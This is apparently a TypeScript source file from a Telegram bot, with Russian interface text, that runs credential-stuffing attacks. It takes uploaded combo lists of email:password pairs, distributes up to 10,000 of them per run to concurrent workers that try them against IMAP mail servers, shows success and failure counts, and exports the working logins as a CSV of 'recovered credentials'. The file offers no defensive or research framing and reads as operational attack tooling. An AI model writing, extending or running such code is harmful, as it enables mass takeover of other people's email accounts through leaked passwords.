import { InlineKeyboard, InputFile, Api } from "grammy";
import { db } from "../../services/db.js";
import { getComboStats, getPendingCombos, importComboContent } from "../../services/combolist/importer.js";
import { DistributedQueue } from "../../services/scaling/distributed-queue.js";
import { exportRecoveredCredentials } from "../../services/matching/recovered-credentials.js";
import { audit } from "../../services/audit.js";
import { config } from "../../config.js";
import type { BotContext } from "../types.js";

const stuffingQueue = new DistributedQueue("credential-stuffing");

export async function handleStuffingCallback(ctx: BotContext) {
  const data = ctx.callbackQuery?.data;
  if (!data?.startsWith("stuff:")) return;

  const action = data.split(":")[1];

  switch (action) {
    case "import":
      (ctx.session as any).awaitingComboFile = true;
      await ctx.answerCallbackQuery();
      await ctx.editMessageText(
        "📂 Отправьте .txt файл с combo list (email:password).",
      );
      return;

    case "run": {
      const pending = await getPendingCombos(ctx.dbUser.id, 10000);
      if (pending.length === 0) {
        await ctx.answerCallbackQuery("Нет pending combos");
        return;
      }

      const items = pending.map((p) => ({
        email: p.email,
        password: p.password,
        comboId: p.id,
      }));

      const { jobCount, totalItems } = await stuffingQueue.distribute(
        items,
        ctx.dbUser.id,
        "imap",
        100,
      );

      audit({
        userId: ctx.dbUser.id,
        type: "stuffing_started",
        level: "INFO",
        message: `Stuffing: ${totalItems} pairs in ${jobCount} jobs`,
      });

      await ctx.answerCallbackQuery("Stuffing запущен");
      await ctx.editMessageText(
        `⏳ <b>Stuffing запущен</b>\n\n` +
          `Pairs: ${totalItems}\n` +
          `Jobs: ${jobCount}\n` +
          `Workers: 15 concurrent`,
        { parse_mode: "HTML" },
      );
      return;
    }

    case "stats": {
      const stats = await getComboStats(ctx.dbUser.id);
      const qStats = await stuffingQueue.getQueueStats();

      await ctx.answerCallbackQuery();
      await ctx.editMessageText(
        `📊 <b>Stuffing Stats</b>\n\n` +
          `Combos: ${stats.total}\n` +
          `  Pending: ${stats.byStatus["pending"] ?? 0}\n` +
          `  Success: ${stats.byStatus["success"] ?? 0}\n` +
          `  Failed: ${stats.byStatus["failed"] ?? 0}\n\n` +
          `Queue: ${qStats.active} active, ${qStats.waiting} waiting`,
        { parse_mode: "HTML" },
      );
      return;
    }

    case "stop":
      await stuffingQueue.pause();
      await ctx.answerCallbackQuery("Stuffing paused");
      return;

    case "results": {
      const buffer = await exportRecoveredCredentials(ctx.dbUser.id, "csv");
      if (buffer.length === 0) {
        await ctx.answerCallbackQuery("Нет результатов");
        return;
      }
      await ctx.replyWithDocument(
        new InputFile(buffer, `stuffing_${Date.now()}.csv`),
        { caption: "🔓 Stuffing Results" },
      );
      await ctx.answerCallbackQuery();
      return;
    }

    case "back": {
      const { mainMenuKeyboard } = await import("../keyboards/main-menu.js");
      await ctx.answerCallbackQuery();
      await ctx.editMessageText("Выберите действие:", {
        reply_markup: mainMenuKeyboard(ctx.dbUser.role, ctx.dbUser.isAdmin),
      });
      return;
    }

    default:
      await ctx.answerCallbackQuery();
  }
}

export async function handleComboFileUpload(ctx: BotContext): Promise<boolean> {
  if (!(ctx.session as any).awaitingComboFile) return false;

  const doc = ctx.message?.document;
  if (!doc) return false;

  (ctx.session as any).awaitingComboFile = false;

  const api = new Api(config.botToken);
  const file = await api.getFile(doc.file_id);
  const url = `https://api.telegram.org/file/bot${config.botToken}/${file.file_path}`;
  const response = await fetch(url);
  const content = await response.text();

  const result = await importComboContent(
    ctx.dbUser.id,
    content,
    doc.file_name ?? "combo-upload",
  );

  audit({
    userId: ctx.dbUser.id,
    type: "combo_imported",
    level: "INFO",
    message: `Imported ${result.imported} combos from ${doc.file_name}`,
  });

  const kb = new InlineKeyboard()
    .text("▶ Start Stuffing", "stuff:run")
    .row()
    .text("📊 Stats", "stuff:stats");

  await ctx.reply(
    `✅ <b>Combo List Imported</b>\n\n` +
      `Lines: ${result.totalLines}\n` +
      `Imported: ${result.imported}\n` +
      `Invalid: ${result.invalid}\n` +
      `Duplicates: ${result.duplicates}`,
    { parse_mode: "HTML", reply_markup: kb },
  );

  return true;
}
